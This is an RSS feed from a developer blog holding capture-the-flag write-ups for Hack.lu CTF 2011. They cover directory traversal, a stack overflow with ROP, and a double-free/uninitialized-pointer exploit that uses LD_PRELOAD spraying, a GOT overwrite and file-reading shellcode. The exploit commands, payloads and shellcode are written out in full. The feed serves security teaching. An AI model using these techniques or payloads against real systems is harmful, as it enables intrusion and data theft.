<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: Hack.lu</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Hack.lu CTF 2011: Nebula Death Stick Services writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-10-03T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</guid>
  <description><![CDATA[
     <h2 id="challenge-information">Challenge Information</h2>

<blockquote>
  <p>Death Sticks are a totally illegal drug in the universe.<br />
However, somehow a company called Death Stick Services has managed to get a huge trade volume by selling Death Sticks directly and anonymously to their costumers.<br />
Seems like nobody has the power to stop them, so the Galactic’s Secret Service ordered YOU and your Special Forces team to get a Shell on Death Stick Service’s server and search for any evidence on how to take them down!<br />
May the force be with you.</p>

  <p>http://ctf.hack.lu:2010/</p>
</blockquote>

<h2 id="analysis">Analysis</h2>

<p><em>Thanks rd for helping Analysis part.</em></p>

<p>Checking around http://ctf.hack.lu:2010/ page, I found that there is a directory traversal vulnerability (<em>http://ctf.hack.lu:2010/?page=../../../../etc/resolv.conf</em>). Together with “<em>./a.out</em>” from HTTP response header, I managed to download the binary via this request <em>http://ctf.hack.lu:2010/?page=../a.out</em>.</p>

<p>“<em>a.out</em>” binary is a 32 bit x86 Linux binary, running on Ubuntu 10.10 server. There is a vulnerability in query parsing function parse_params as below.</p>

<p><a href="/wp/storage/uploads/2011/10/parse_params.jpg"><img class="aligncenter size-full wp-image-1236" title="parse_params" src="/wp/storage/uploads/2011/10/parse_params.jpg" alt="parse_params" width="372" height="407" /></a></p>

<p><strong>parse_params()</strong> function basically looks ‘<em>?</em>‘ and ‘<em>=</em>‘ in order to parse the input query such as <em>/?page=blah</em>, and then uses the different in length (<strong>len</strong>) to store parameter name and its value to the buffer on the stack of the caller function (<strong>handle_connection()</strong>). From above code, you can see that if we input in reverse order of ‘<em>?</em>‘ and ‘<em>=</em>‘ such as* /=blah?*, <strong>len</strong> value will be negative but it still pass the the condition check because of signed comparison. This leads into a traditional stack buffer overflow.</p>

<blockquote>
  <p>$ python2 -c ‘print “GET /=” + “A”*60 + “? HTTP/”‘|nc -v localhost 2010<br />
..<br />
(gdb) run<br />
Starting program: /home/jail/ctf/hack.lu/o500/a.out<br />
Notice: Nebulaserv – A Webserver for Nebulacorp</p>

  <p>Notice: Starting up!</p>

  <ul>
    <li>Accepting requests on port 2010<br />
[New process 4626]  </li>
    <li>
      <p>Got request with length 0: 127.0.0.1:35695 – GET /=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA? HTTP/</p>
    </li>
    <li>Got param: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt; with value  </li>
    <li>Opening ./nebula/index – 404 Not Found</li>
  </ul>

  <p>Program received signal SIGSEGV, Segmentation fault.<br />
[Switching to process 4626]<br />
0×41414141 in ?? ()</p>
</blockquote>

<h2 id="exploit">Exploit</h2>

<p>The binary has NX and ASLR enabled so we have to leak libc info from server for ROP/ret2libc exploit. During the game, to save time we utilized shell on the same server from Nebula DB challenge to retrieved libc, then constructed a ROP payload to call a custom shell script as <em>system(“/tmp/sh”)</em>. After the game, we investigate more to see if we can exploit without any knowledge of server. And here is the way we do:</p>

<h3 id="retrieve-libc">Retrieve libc</h3>

<p>In **handle_connection() **function socket fd is increased for every new connection. Though we can find this value on stack, it is still difficult to find code chunks to write back something valuable to our socket. Instead, we can utilize the directory traversal bug above to retrieve libc via this request: <span style="font-style: italic">http://ctf.hack.lu:2010/?page=../../../../lib/libc.so.6</span></p>

<h3 id="construct-rop-payload">Construct ROP payload</h3>

<p>With libc in hand, we know exact offset to any libc function and ROP payload can be constructed using “<a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/" target="_self">data re-use way</a>” via <em>sprintf() – *which can perform byte-per-byte transfer the same as *strcpy() – *or “<a href="http://auntitled.blogspot.com/2011/09/rop-with-common-functions-in.html" target="_blank">ROP with common functions in Ubuntu/Debian x86</a>“</em>. *</p>

<h3 id="the-flag">The flag</h3>

<p>The flag was put in a file with strange name so you cannot guess and get it via directory traversal bug.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ ls -l /home/nebulaserver

total 24

-r-xr-x--- 1 root nebulaserver 11195 2011-09-11 20:50 a.out

-r--r----- 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD

drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula

-r-xr-x--- 1 root nebulaserver    82 2011-09-20 17:00 restart.sh

$ cat /home/nebulaserver/IguessTHISisTHEflagDOOD

Flag: R0PPINGy0urWAYinDUDE

</pre>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ ls -l /home/nebulaserver
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  total 24
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver 11195 2011-09-11 20:50 a.out
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r&#8211;r&#8212;&#8211; 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  Flag: R0PPINGy0urWAYinDUDE
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $
</div>

<ul>
  <li>*</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>hack.lu CTF 2011 nebula DB systems</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/22/hack-lu-ctf-2011-nebula-db-systems.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-22T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/22/hack-lu-ctf-2011-nebula-db-systems.html</guid>
  <description><![CDATA[
     <p>Challenge Summary:</p>

<blockquote>
  <p>While you were investigating the Webserver of Nebula Death Stick Services, we, the Galactic’s Secret Service, put our hands on a SSH account of one of the Nebula Death Stick Services founders. This account directly leads to one of their Death Stick storage clusters. Therefore we instruct you with another mission: this time you will have to break their database systems in order to get higher privileges and find further infos about Nebula Corp. And again, may the force be with you!<br />
User: nebulauser</p>

  <p>Pass: nebulauser</p>

  <p>Host: ctf.hack.lu</p>

  <p>Port: 2008</p>
</blockquote>

<p>After login to ctf.hack.lu server we get 4 files:<br />
-nebula_db<br />
-nebula_db_nosuid<br />
_nebula_db.c<br />
_hint</p>

<p>nebula_db is a file with suid(s) bits, when you execute that you have required permission to read the flag, nebula_db_nosuid is the file for testing and debuging purpose, nebula_db.c is source code of challenge, hint is tell you where is the flag stored.<br />
So basically you need to execute nebula_db and some how try to alter execution flow to do some more thing for you ( read the flag ).<br />
First things is try to spot the vuln by reading source code they provided:</p>

<pre class="brush: cpp; title: ; notranslate" title="">/* Nebula Death Stick Services Database Management System
 * This Software has been written to keep track of our customers and their orders.
 * It is still in developement, but I'm pretty sure it's already stable enough for a safe maintenance.
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#define DB_SIZE 256

char *db[DB_SIZE];

int edit_entry(char *choice, unsigned int entry)
{
        char edit[256], *ln;
        unsigned int len;

        if (atoi(choice) &gt; entry - 1 || atoi(choice) &lt; 0 || entry == 0)
                return -1;

        len = strlen(db[atoi(choice)]);

        printf("Enter your edit: ");
        fgets(edit, sizeof(edit) - 1, stdin);

        ln = strchr(edit, 'n');

        if (ln != NULL)
                *ln = '&#092;&#048;';

        strncpy(db[atoi(choice)], edit, len);

        return 0;
}

char *insert_new_order(unsigned int entry, char *name, char *amount)
{
        char sname[256], samount[256], *nl, *ptr;(3)
        int ret;

        nl = strchr(name, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        nl = strchr(amount, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        ret = asprintf(&amp;ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);

        if (ret == 0)
                return NULL;

        return ptr;
}

char *enter_new_order(unsigned int entry)
{
        char name[256], amount[256];

        printf("Enter a Name: ");
        fgets(name, sizeof(name) - 1, stdin);

        printf("Enter amount of Death Sticks: ");
        fgets(amount, sizeof(amount) - 1, stdin);

        if (atoi(amount) &lt;= 0) {
                fprintf(stderr, "Insert a real amount please!n");
                return NULL;
        }

        if (entry &gt; DB_SIZE - 1) {
                fprintf(stderr, "Database already full!n");
                return NULL;
        }

        return insert_new_order(entry, name, amount);

}

int print_database(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                printf("%sn", db[i]);

        return 0;
}

int exit_free(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                free(db[i]);

        return 0;
}

int main(int argc, char **argv)
{
        char choice[256], *ret;
        unsigned int entry = 0, len, i;

        puts(
                "Nebula Database set up!n"
                "Enter your choice of action:n"
                "1 - Insert new ordern"
                "2 - Edit ordern"
                "3 - List ordersn"
                "4 - Exitn"
        );

        while (1) {(4)
                printf("Your choice: ");
                fgets(choice, sizeof(choice) - 1, stdin);
                switch (atoi(choice)) {
                        case 1:
                        ret = enter_new_order(entry);

                        if (ret == NULL) {
                                fprintf(stderr, "Error inserting new order!n");
                                break;
                        }

                        db[entry] = ret;
                        entry++;(2)
                        break;

                        case 2:
                        printf("Enter the ID of your order: ");
                        fgets(choice, sizeof(choice) - 1, stdin);

                        if (edit_entry(choice, entry) == -1)
                                fprintf(stderr, "That entry does not exist!n");

                        break;

                        case 3:
                        print_database(entry);
                        break;

                        case 4:
                        return exit_free(entry);

                        default:
                        fprintf(stderr, "Option does not existn");
                }
        }

        return 0;
}

</pre>

<p>As they said, the challenge is a small db management, it save name and amount of orders in an array up to 256 record. You can add or edit a record.<br />
So the funny part is:</p>

<pre class="brush: cpp; title: ; notranslate" title="">ret = asprintf(&amp;ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);
   if (ret == 0)
                return NULL;
</pre>

<p>And after reading manpages of asprintf, i figured out there is a problem when using it without fully understand what it returned, so return value indicate how many bytes it printed, and the funny part is when it failed, it will return -1 but programmer is not check for that case, they think when it will return 0 mean it failed.<br />
It mean we can still increase entry value at (2) without create any new record. It basic will lead to double free memory corruption error. So next thing is try to figure out how to force asprintf return -1 ( or force it can’t alloc any memory ). After getting help from rd and xichzo, we found ulimit do the tricks:</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 4
*** glibc detected *** ./n: double free or corruption (out): 0x08049118 ***
Aborted (core dumped)
suto@ubuntu:~$
</pre>

<p>After getting here, i see another way can lead to successful exploitation. When asprintf fail, it will use ptr(3) at a result for main program use to keep track a record, somehow we can make this ptr point to some where we want and edit_entry will take care the rest to write a value we control to that address(since ptr is use without initialized)<br />
But i can’t find anyway to do that, so i thinking another solution.<br />
And i wonder if when the first alloc failt, so it will use the original value of at that address. After some check i’m stuck cause i can’t not do anything without this default value.<br />
I try some google in hopeless :p with keyword: “control uninitialized memory”<br />
At the first resutls is:<br />
<a href="http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html">http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html<br />
</a><br />
Another trick to control memory at the begining of process execution. Let’s check:</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "A"*20000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
ERROR: ld.so: object '&lt;A&gt;*20000...
 from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 2
Enter the ID of your order: 0
Segmentation fault (core dumped)
suto@ubuntu:~$
</pre>

<p>So if this tricks work, we will have a write to address at 0×41414141.</p>

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/i $eip
=&gt; 0xb764b706:  movdqu (%edi),%xmm1
(gdb) i r $edi
edi            0x41414141       1094795585
(gdb) bt
#0  0xb764b706 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x0804864c in edit_entry ()
#2  0x08048a04 in main ()
</pre>

<p>So this is all i want :p Next things is find some where to write, and i choose GOT section, first thing i trying is printf@GOT and using a hardcode address to return, and i stupid try to do that to the end of the game :(.<br />
After that, thinking a little bit, i got another solution:<br />
After the calling edit_entry ( where we can directly write to GOT section), program will return to while loop at (4) and continue execute, then i see a good candidate to overwrite is atoi, why? cause after fgets at (5) eax will point to our string, and we will use call *eax gadget to execute our shellcode.<br />
And finally:</p>

<pre class="brush: bash; title: ; notranslate" title="">export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
</pre>

<p>This will force program wirte to atoi@PLT and</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ objdump -d n | grep call | grep eax
 80485a8:       ff 14 85 08 90 04 08    call   *0x8049008(,%eax,4)
 80485ef:       ff d0                   call   *%eax
 8048b1b:       ff d0                   call   *%eax
suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+"x1bx8bx04x08"*40+"xcc"*400' &gt; input
suto@ubuntu:~$ bash
suto@ubuntu:~$ ulimit -s unlimited
suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db &lt; input
ERROR: ld.so: object from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Trace/breakpoint trap (core dumped)
.......
(gdb) x/20x $eip
0xbfa33571:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33581:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33591:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335a1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335b1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
</pre>

<p>So you can replace xcc with a shellcode to read the flag key file.<br />
Here is my shellcode to read /home/suto/flag and write to /tmp/flag: ( <a href="http://pastebin.com/yWUE40cM">assembly source</a>)</p>

<pre class="brush: cpp; title: ; notranslate" title="">char shellcode[] =
        "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41"
        "xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3"
        "x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1"
        "x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0"
        "xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff"
        "x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67"
        "x41x2fx74x6dx70x2fx66x6cx61x67";

</pre>

<pre class="brush: cpp; title: ; notranslate" title="">suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+  "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41       xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3
x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1
x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0
xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff
x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67
x41x2fx74x6dx70x2fx66x6cx61x67";' &gt; input
suto@ubuntu:~$./nebula_db &lt; input
suto@ubuntu:~$cat /tmp/flag
hello
</pre>

<p>Finally,congratz to bobsleigh is the only team solved it.<br />
Thanks fluzfinger team for a great ctf. See u guys in next year!</p>

<p>–suto–</p>


  ]]></description>
</item>

	<item>
  <title>#4th at hack.lu CTF</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/21/4th-at-hack-lu-ctf.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-21T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/21/4th-at-hack-lu-ctf.html</guid>
  <description><![CDATA[
     <p style="text-align: center">
  Thanks <a href="http://fluxfingers.net/" target="_blank">FluxFingers</a> for the great #CTF at <a href="http://2011.hack.lu/index.php/CaptureTheFlag" target="_blank">hack.lu</a>!!!!
</p>

<p>[<img class="aligncenter size-full wp-image-1174" title="final_score" src="/wp/storage/uploads/2011/09/final_score.png" alt="final_score" width="306" height="352" />][1]</p>

<p style="text-align: -webkit-auto">

 [1]: /wp/storage/uploads/2011/09/final_score.png
</p>

  ]]></description>
</item>

</channel>
</rss>